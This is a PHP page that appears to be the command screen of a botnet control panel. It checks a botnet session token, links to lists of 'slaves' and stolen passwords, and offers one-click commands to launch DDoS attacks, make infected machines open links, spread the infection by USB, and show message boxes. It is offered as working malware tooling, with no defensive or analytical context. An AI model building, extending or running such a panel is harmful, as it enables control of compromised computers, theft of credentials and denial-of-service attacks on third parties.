<?
session_start();
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../index.php';</script>";
}
?>
<html>
<head>
<title>Mustafa Riadh</title>
<link rel="stylesheet" type="text/css" href="../style/plugins.css">
<link rel="stylesheet" type="text/css" href="style/main.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../mustafa.php")) 
{
$checker = fopen("../mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
</head>
<body>
<div id="navbar">
<img src="images/mustafa.jpg" width="50" class="image">
<a class="username"><? echo($usernamec) ?></a>
<br><br><br>
<div id="navbar-menu">
<hr class="navbar-hr" color="#3ab4a6">
<a href="index.php" style="text-decoration: none;"><font class="navbar-button-active">DASHBOARD</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="show_slaves.php" style="text-decoration: none;"><font class="navbar-button">SLAVES LIST</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="commands.php" style="text-decoration: none;"><font class="navbar-button">COMMANDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="passwords.php" style="text-decoration: none;"><font class="navbar-button">PASSWORDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="#reload" style="text-decoration: none;"><font class="navbar-button">RELOAD BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="help.php" style="text-decoration: none;"><font class="navbar-button">HELP PAGE</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="about.php" style="text-decoration: none;"><font class="navbar-button">ABOUT BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="logout.php" style="text-decoration: none;"><font class="navbar-button">LOGOUT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
</div>
</div>
<div class="datagrid">
<table width="80%" style="position : absolute; left : 250px;" border="1">
<thead><tr><th>COMMAND</th><th>DESCRIPTION</th></thead>
<tbody>
<tr><td>DDOS ATTACK</td><td>PERFORM DDOS ATTACK FOR ALL SLAVES</td><td>
<form action="../commands/send_command.php" method="get">
<input type="hidden" name="action" value="ddos">
<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
</form>
</td></tr>
<tr><td>VISIT LINK</td><td>OPEN LINK FOR ALL SLAVES</td><td>
<form action="../commands/send_command.php" method="get">
<input type="hidden" name="action" value="visitlink">
<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
</form>
</td></tr>
<tr><td>START SPREADING</td><td>USB SPREADING</td><td>
<form action="../commands/send_command.php" method="get">
<input type="hidden" name="action" value="spreading">
<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
</form>
</td></tr>
<tr><td>MESSAGE BOX</td><td>SEND MESSAGE BOX</td><td>
<form action="../commands/send_command.php" method="get">
<input type="hidden" name="action" value="msgbox">
<select  onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">SEND ACTION</option></select>
</form>
</td></tr>
</tbody>
</table></div>
</body>
</html>